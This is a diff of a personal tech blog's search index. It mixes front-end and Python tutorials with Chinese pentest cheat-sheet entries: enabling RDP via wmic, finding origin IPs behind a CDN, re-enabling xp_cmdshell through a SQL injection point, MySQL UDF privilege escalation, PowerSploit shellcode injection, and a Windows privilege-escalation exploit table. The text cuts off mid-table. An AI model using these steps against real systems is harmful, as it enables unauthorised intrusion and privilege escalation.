@@ -1,6 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>antd多行溢出tooltip实现</title>
+    <url>/2022/12/27/antd%E5%A4%9A%E8%A1%8C%E6%BA%A2%E5%87%BAtooltip%E5%AE%9E%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>typography.paragraph 组件实现了单行/多行溢出展示tooltip的功能</p>
+</blockquote>
+<h2 id="1-判断是否可以使用CSS实现"><a href="#1-判断是否可以使用CSS实现" class="headerlink" title="1.判断是否可以使用CSS实现"></a>1.判断是否可以使用CSS实现</h2><p>单行模式且支持<code>textOverflow</code> 或者 多行模式且支持<code>webkitLineClamp</code>则判断为可以使用CSS实现溢出</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-ae8d22e31dce693f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>通过判断样式名是否在<code>documentElement.style</code>中存在来判断是否支持此样式</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-3415f3971b001ed1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="2-CSS实现溢出情况下判断是否溢出"><a href="#2-CSS实现溢出情况下判断是否溢出" class="headerlink" title="2.CSS实现溢出情况下判断是否溢出"></a>2.CSS实现溢出情况下判断是否溢出</h2><p>单行时先设置样式<code>white-space: nowrap</code>使文本不换行，再判断<code>rangeWidth&gt;textEleWidth</code>或者<code>scrollWidth&gt;offsetWidth</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-5d2793beb83bd23f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>多行时则直接判断<code>offsetHeight &lt; scrollHeight</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-920ea434c4241429.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="3-JS实现多行溢出"><a href="#3-JS实现多行溢出" class="headerlink" title="3.JS实现多行溢出"></a>3.JS实现多行溢出</h2><p>通过渲染一个隐藏的不换行<code>span</code>元素获取单行的文本高度<code>ref.current?.offsetHeight</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-0a477ec260f6611d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>通过<code>ref.offsetHeight &gt; rows * singleRowHeight</code>判断当前dom高度是否大于最大行数的理论高度来判断是否溢出，同时通过<code>二分查找</code>来查找溢出的临界点</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-8d86c7cd564e9a52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+]]></content>
+      <categories>
+        <category>WEB前端</category>
+      </categories>
+      <tags>
+        <tag>webpack</tag>
+      </tags>
+  </entry>
+  <entry>
     <title> cmd开启3389		</title>
     <url>/2018/07/29/cmd-e5-bc-80-e5-90-af3389/</url>
     <content><![CDATA[<p>win2003<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' <span class="keyword">call</span> SetAllowTSConnections <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
@@ -99,6 +125,25 @@ ew -s rssocks -d 本机ip -e 888
       </categories>
   </entry>
   <entry>
+    <title> 绕过CDN查找真实ip		</title>
+    <url>/2018/09/02/e7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip/</url>
+    <content><![CDATA[<blockquote>
+<p>可通过多地ping的方法，判断是否加了cdn</p>
+</blockquote>
+<ul>
+<li>内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。</li>
+<li>扫描测试文件，如phpinfo，test等</li>
+<li>子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip</li>
+<li>国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了</li>
+<li>域名的解析记录。通过在线网站（<a href="http://site.ip138.com）" target="_blank" rel="noopener">http://site.ip138.com）</a> ，查询域名的历史解析记录和当前解析记录</li>
+<li>app。目标网可能有自己的app，通过抓包可能获得到目标真实ip</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title> flask+nginx+uwsgi配置		</title>
     <url>/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/</url>
     <content><![CDATA[<h3 id="uwsgi配置（-ini）"><a href="#uwsgi配置（-ini）" class="headerlink" title="uwsgi配置（.ini）"></a>uwsgi配置（.ini）</h3><pre><code>[uwsgi]
@@ -128,25 +173,6 @@ virtualenv＝/home/proj/virtualenv #python虚拟环境
 </code></pre>]]></content>
       <categories>
         <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> 绕过CDN查找真实ip		</title>
-    <url>/2018/09/02/e7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip/</url>
-    <content><![CDATA[<blockquote>
-<p>可通过多地ping的方法，判断是否加了cdn</p>
-</blockquote>
-<ul>
-<li>内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。</li>
-<li>扫描测试文件，如phpinfo，test等</li>
-<li>子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip</li>
-<li>国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了</li>
-<li>域名的解析记录。通过在线网站（<a href="http://site.ip138.com）" target="_blank" rel="noopener">http://site.ip138.com）</a> ，查询域名的历史解析记录和当前解析记录</li>
-<li>app。目标网可能有自己的app，通过抓包可能获得到目标真实ip</li>
-</ul>
-]]></content>
-      <categories>
-        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
@@ -238,6 +264,28 @@ DROP DATABASE test;
       </tags>
   </entry>
   <entry>
+    <title> Mssql开启xp_cmdshell		</title>
+    <url>/2018/07/29/mssql-e5-bc-80-e5-90-afxp-cmdshell/</url>
+    <content><![CDATA[<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;,0;
+RECONFIGURE;
+</code></pre><a id="more"></a>
+<h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;, 1;
+RECONFIGURE;
+</code></pre><p>在注入点运行上述语句时,如果出现这样的回显,<code>标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在</code>,可执行以下语句</p>
+<pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;
+RECONFIGURE;
+EXEC sp_configure &apos;user connections&apos;,1;
+RECONFIGURE;
+</code></pre>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title> Mysql udf提权		</title>
     <url>/2018/07/29/mysql-udf-e6-8f-90-e6-9d-83/</url>
     <content><![CDATA[<h4 id="1-（前期准备）得到udf-dll-16进制"><a href="#1-（前期准备）得到udf-dll-16进制" class="headerlink" title="1.（前期准备）得到udf.dll 16进制"></a>1.（前期准备）得到udf.dll 16进制</h4><p>先在本地用udf专用马将udf.dll导出</p>
@@ -316,28 +364,6 @@ location ~* \.(gif|jpg|jpeg)$ {
       </categories>
   </entry>
   <entry>
-    <title> Mssql开启xp_cmdshell		</title>
-    <url>/2018/07/29/mssql-e5-bc-80-e5-90-afxp-cmdshell/</url>
-    <content><![CDATA[<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项
-RECONFIGURE;
-EXEC sp_configure &apos;xp_cmdshell&apos;,0;
-RECONFIGURE;
-</code></pre><a id="more"></a>
-<h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;
-RECONFIGURE;
-EXEC sp_configure &apos;xp_cmdshell&apos;, 1;
-RECONFIGURE;
-</code></pre><p>在注入点运行上述语句时,如果出现这样的回显,<code>标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在</code>,可执行以下语句</p>
-<pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;
-RECONFIGURE;
-EXEC sp_configure &apos;user connections&apos;,1;
-RECONFIGURE;
-</code></pre>]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title> Nishang/PowerSploit		</title>
     <url>/2018/08/05/nishang-powersploit/</url>
     <content><![CDATA[<blockquote>
@@ -381,6 +407,72 @@ Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行
 </code></pre>]]></content>
       <categories>
         <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> Python3 生成器		</title>
+    <url>/2019/02/24/python3-e7-94-9f-e6-88-90-e5-99-a8/</url>
+    <content><![CDATA[<blockquote>
+<p>在 Python 中，使用了<code>yield</code>的函数被称为生成器（generator）。在通过<code>__next__()</code> 调用生成器时，会执行到下一个yield停止，返回 yield 的值，在下一次执行 <code>__next__()</code> 方法时从当前位置继续运行，没有下一个yield时抛出<code>StopIteration</code>的异常。生成器可以用for循环迭代。</p>
+</blockquote>
+<h3 id="1-列表生成式"><a href="#1-列表生成式" class="headerlink" title="1.列表生成式"></a>1.列表生成式</h3><blockquote>
+<p>将列表生成式的<code>[]</code>改成<code>()</code>，就创建了一个生成器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x104feab40</span>&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="2-函数"><a href="#2-函数" class="headerlink" title="2.函数"></a>2.函数</h3><blockquote>
+<p>含有<code>yield</code>关键字的函数被认为是生成器。</p>
+</blockquote>
+<p>斐波拉契数列：</p>
+<pre><code>
+def fib(max):
+    n, a, b = 0, 0, 1
+    while n < max:
+        yield b
+        a, b = b, a + b
+        n = n + 1
+</code></pre>
+
+
+<h3 id="3-next-and-send"><a href="#3-next-and-send" class="headerlink" title="3.___next__() and send()"></a>3.<code>___next__()</code> and <code>send()</code></h3><ul>
+<li><code>___next__()</code>，执行到下一个yield处，并返回值，</li>
+<li><code>send(val)</code>，执行到下一个yield处，并返回值，val可以设置上一个yield表达式的返回值<code>(m= yield 5)</code>，yield 5这个表达式是没有返回值的，所以m=None，但是<code>send(val)</code>可以设置m=val，第一次运行next时在yield处返回，m没有被赋值，第二次执行send(val)时，从此处接着执行，设置m=val，并运行到下一个yield处</li>
+<li><code>___next__()</code> == <code>send(None)</code></li>
+</ul>
+<blockquote>
+<p>生产者消费者问题：生产者生产-&gt;消费者消费-&gt;生产者生产…</p>
+</blockquote>
+<pre><code>
+def consumer():
+    r = ''
+    while True:
+        n = yield r
+        if not n:
+            return
+        print('[CONSUMER] Consuming %s...' % n)
+        r = '200 OK'
+
+def produce(c):
+    c.send(None)
+    n = 0
+    while n < 5:
+        n = n + 1
+        print('[PRODUCER] Producing %s...' % n)
+        r = c.send(n)
+        print('[PRODUCER] Consumer return: %s' % r)
+    c.close()
+
+c = consumer()
+produce(c)
+</code></pre>   
+
+
+<p>结果:</p>
+<p><pre><code><br>[PRODUCER] Producing 1…<br>[CONSUMER] Consuming 1…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 2…<br>[CONSUMER] Consuming 2…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 3…<br>[CONSUMER] Consuming 3…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 4…<br>[CONSUMER] Consuming 4…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 5…<br>[CONSUMER] Consuming 5…<br>[PRODUCER] Consumer return: 200 OK</code></pre></p>
+<p><pre><code></code></pre></p>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
       </categories>
   </entry>
   <entry>
@@ -455,116 +547,6 @@ event_loop.run_until_complete(asyncio.wait(tasks))
       </categories>
   </entry>
   <entry>
-    <title>webpack构建react项目</title>
-    <url>/2020/08/10/webapck%E6%9E%84%E5%BB%BAreact/</url>
-    <content><![CDATA[<h4 id="1-创建基本项目结构"><a href="#1-创建基本项目结构" class="headerlink" title="1.创建基本项目结构"></a>1.创建基本项目结构</h4><p>安装react typescript</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add react react-dom</span><br><span class="line"></span><br><span class="line">yarn add -D @types/react @types/react-dom</span><br></pre></td></tr></table></figure>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add typescript -D</span><br></pre></td></tr></table></figure>
-<p>配置typescript</p>
-<p>tsconfig.json</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"compilerOptions"</span>: &#123;</span><br><span class="line">        <span class="string">"jsx"</span>: <span class="string">"react"</span>, <span class="comment">//在tsx里面支持jsx</span></span><br><span class="line">        <span class="string">"isolatedModules"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"esModuleInterop"</span>:<span class="literal">true</span>, </span><br><span class="line">        <span class="comment">//允许从没有设置默认导出的模块中默认导入 import * as fs from 'fs' 等于 import fs from 'fs'</span></span><br><span class="line">        <span class="string">"strict"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"baseUrl"</span>:<span class="string">"./"</span>, <span class="comment">//解析非相对模块名的基准目录</span></span><br><span class="line">        <span class="string">"paths"</span>: &#123;</span><br><span class="line">            <span class="comment">// 配置模块路径映射</span></span><br><span class="line">            <span class="string">"@/*"</span>: [<span class="string">"./src/*"</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"skipLibCheck"</span>:<span class="literal">true</span>,<span class="comment">//忽略所有的声明文件（ *.d.ts）的类型检查</span></span><br><span class="line">        <span class="comment">// 下面这些选项对 babel 编译 TypeScript 没有作用但是可以让 VSCode 等编辑器正确提示错误</span></span><br><span class="line">        <span class="string">"target"</span>: <span class="string">"ES2019"</span>,</span><br><span class="line">        <span class="string">"module"</span>: <span class="string">"ESNext"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"include"</span>: [</span><br><span class="line">        <span class="string">"./src/**/*"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>src/App.tsx</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line"></span><br><span class="line">const App = React.memo(()=&gt;&#123;</span><br><span class="line">    return (</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            hello world</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure>
-<p>src/index.tsx</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line">import ReactDOM from &apos;react-dom&apos;;</span><br><span class="line">import App from &apos;./App&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;App/&gt;,</span><br><span class="line">    document.getElementById(&apos;app&apos;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<p>public/index.html</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="2-编译tsx打包"><a href="#2-编译tsx打包" class="headerlink" title="2.编译tsx打包"></a>2.编译tsx打包</h4><p>安装webpack</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack webpack-cli</span><br></pre></td></tr></table></figure>
-<p>安装babel编译ts,jsx</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add babel-loader @babel/core @babel/preset-typescript @babel/preset-react -D</span><br></pre></td></tr></table></figure>
-<p>babel.config.json</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"presets"</span>:[</span><br><span class="line">      <span class="string">"@babel/preset-react"</span>,</span><br><span class="line">      <span class="string">"@babel/preset-typescript"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>webpack 添加babel-loder</p>
-<p>webpack.dev.js</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode: <span class="string">"development"</span>,</span><br><span class="line">    devtool: <span class="string">"inline-source-map"</span>,</span><br><span class="line">    entry: <span class="string">'./src/index.tsx'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        publicPath:<span class="string">'./public'</span>,</span><br><span class="line">        filename: <span class="string">'[name].js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'./dist'</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        <span class="comment">// 导入ts 等模块一般不写后缀名，webpack 会尝试使用这个数组提供的后缀名去导入</span></span><br><span class="line">        extensions: [<span class="string">'.ts'</span>, <span class="string">'.tsx'</span>, <span class="string">'.js'</span>, <span class="string">'.json'</span>],</span><br><span class="line">        alias:&#123;</span><br><span class="line">            <span class="string">"@"</span>: path.resolve(__dirname, <span class="string">'src/'</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">          &#123;</span><br><span class="line">            test: <span class="regexp">/\.(tsx?|js)$/</span>,</span><br><span class="line">            loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">            options: &#123; <span class="attr">cacheDirectory</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            include: [</span><br><span class="line">                path.resolve(__dirname, <span class="string">"src"</span>)</span><br><span class="line">            ],</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h4 id="3-webpack-dev-server"><a href="#3-webpack-dev-server" class="headerlink" title="3.webpack-dev-server"></a>3.webpack-dev-server</h4><p>每次都要webpack打包，刷新浏览器很麻烦，通过webpack-dev-server本地开启一个server，文件变更后自动编译更新。webpack-dev-server打包后的文件在内存中并没有实际的文件。打包后的文件访问通过output.publicPath控制，默认是根目录，也就是dev server的根目录</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack-dev-server</span><br></pre></td></tr></table></figure>
-<p>package.json scripts</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"webpack --config webpack.dev.js"</span>,</span><br><span class="line">    <span class="attr">"dev"</span>: <span class="string">"webpack-dev-server --config webpack.dev.js --open --hot"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="4-使用html-webpack-plugin自动插入bundle-js"><a href="#4-使用html-webpack-plugin自动插入bundle-js" class="headerlink" title="4.使用html-webpack-plugin自动插入bundle.js"></a>4.使用html-webpack-plugin自动插入bundle.js</h4><p>可以根据模版文件，插入bundle.js后生成新的文件</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add html-webpack-plugin -D</span><br></pre></td></tr></table></figure>
-<p>webpack.dev.js</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">        new HtmlWebpackPlugin(&#123;</span><br><span class="line">          template: './public/index.html'  // 在  output.path 目录下生成文件</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="5-eslint-代码风格"><a href="#5-eslint-代码风格" class="headerlink" title="5.eslint 代码风格"></a>5.eslint 代码风格</h4><p>.eslintrc.js</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    root: <span class="literal">true</span>,</span><br><span class="line">    parser: <span class="string">'@typescript-eslint/parser'</span>,</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="string">'@typescript-eslint'</span>,</span><br><span class="line">    ],</span><br><span class="line">    extends: [</span><br><span class="line">      <span class="string">'eslint:recommended'</span>,</span><br><span class="line">      <span class="string">'plugin:@typescript-eslint/recommended'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><code>yarn eslint ./src --ext .ts,.tsx</code></p>
-]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-      <tags>
-        <tag>webpack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title> Python3 生成器		</title>
-    <url>/2019/02/24/python3-e7-94-9f-e6-88-90-e5-99-a8/</url>
-    <content><![CDATA[<blockquote>
-<p>在 Python 中，使用了<code>yield</code>的函数被称为生成器（generator）。在通过<code>__next__()</code> 调用生成器时，会执行到下一个yield停止，返回 yield 的值，在下一次执行 <code>__next__()</code> 方法时从当前位置继续运行，没有下一个yield时抛出<code>StopIteration</code>的异常。生成器可以用for循环迭代。</p>
-</blockquote>
-<h3 id="1-列表生成式"><a href="#1-列表生成式" class="headerlink" title="1.列表生成式"></a>1.列表生成式</h3><blockquote>
-<p>将列表生成式的<code>[]</code>改成<code>()</code>，就创建了一个生成器</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x104feab40</span>&gt;</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<h3 id="2-函数"><a href="#2-函数" class="headerlink" title="2.函数"></a>2.函数</h3><blockquote>
-<p>含有<code>yield</code>关键字的函数被认为是生成器。</p>
-</blockquote>
-<p>斐波拉契数列：</p>
-<pre><code>
-def fib(max):
-    n, a, b = 0, 0, 1
-    while n < max:
-        yield b
-        a, b = b, a + b
-        n = n + 1
-</code></pre>
-
-
-<h3 id="3-next-and-send"><a href="#3-next-and-send" class="headerlink" title="3.___next__() and send()"></a>3.<code>___next__()</code> and <code>send()</code></h3><ul>
-<li><code>___next__()</code>，执行到下一个yield处，并返回值，</li>
-<li><code>send(val)</code>，执行到下一个yield处，并返回值，val可以设置上一个yield表达式的返回值<code>(m= yield 5)</code>，yield 5这个表达式是没有返回值的，所以m=None，但是<code>send(val)</code>可以设置m=val，第一次运行next时在yield处返回，m没有被赋值，第二次执行send(val)时，从此处接着执行，设置m=val，并运行到下一个yield处</li>
-<li><code>___next__()</code> == <code>send(None)</code></li>
-</ul>
-<blockquote>
-<p>生产者消费者问题：生产者生产-&gt;消费者消费-&gt;生产者生产…</p>
-</blockquote>
-<pre><code>
-def consumer():
-    r = ''
-    while True:
-        n = yield r
-        if not n:
-            return
-        print('[CONSUMER] Consuming %s...' % n)
-        r = '200 OK'
-
-def produce(c):
-    c.send(None)
-    n = 0
-    while n < 5:
-        n = n + 1
-        print('[PRODUCER] Producing %s...' % n)
-        r = c.send(n)
-        print('[PRODUCER] Consumer return: %s' % r)
-    c.close()
-
-c = consumer()
-produce(c)
-</code></pre>   
-
-
-<p>结果:</p>
-<p><pre><code><br>[PRODUCER] Producing 1…<br>[CONSUMER] Consuming 1…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 2…<br>[CONSUMER] Consuming 2…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 3…<br>[CONSUMER] Consuming 3…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 4…<br>[CONSUMER] Consuming 4…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 5…<br>[CONSUMER] Consuming 5…<br>[PRODUCER] Consumer return: 200 OK</code></pre></p>
-<p><pre><code></code></pre></p>
-]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
     <title> Supervisor		</title>
     <url>/2018/10/20/supervisor/</url>
     <content><![CDATA[<blockquote>
@@ -632,16 +614,6 @@ supervisorctl  stop [all]|[name] #关闭所有/指定的程序进程
       </categories>
   </entry>
   <entry>
-    <title> windows提权对照表		</title>
-    <url>/2018/08/03/windows-e6-8f-90-e6-9d-83-e5-af-b9-e7-85-a7-e8-a1-a8/</url>
-    <content><![CDATA[<p><a href="https://github.com/SecWiki/windows-kernel-exploits" title="exp下载地址" target="_blank" rel="noopener"><font color="#F08080">exp下载地址</font></a></p>
-<a id="more"></a>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Security Bulletin   #KB     #Description    #Operating System</span></span><br><span class="line"> </span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-0213</span> 　[Windows COM Elevation of Privilege Vulnerability]　　(windows <span class="number">10</span>/<span class="number">8.1</span>/<span class="number">7</span>/<span class="number">2016</span>/<span class="number">2010</span>/<span class="number">2008</span>)</span><br><span class="line">MS17<span class="number">-010</span> 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows <span class="number">7</span>/<span class="number">2008</span>/<span class="number">2003</span>/XP)</span><br><span class="line">MS16<span class="number">-135</span> 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(<span class="number">2016</span>)</span><br><span class="line">MS16<span class="number">-098</span> 　[KB3178466]　　[Kernel Driver]　　(Win <span class="number">8.1</span>)</span><br><span class="line">MS16<span class="number">-075</span> 　[KB3164038]　　[Hot Potato]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-032</span> 　[KB3143141]　　[Secondary Logon Handle]　　(<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">10</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-016</span> 　[KB3136041]　　[WebDAV]　　(<span class="number">2008</span>/Vista/<span class="number">7</span>)</span><br><span class="line">MS15<span class="number">-097</span> 　[KB3089656]　　[remote code execution]　　(win8<span class="number">.1</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-076</span> 　[KB3067505]　　[RPC]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-077</span> 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/<span class="number">2000</span>/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-061</span> 　[KB3057839]　　[Kernel Driver]　　(<span 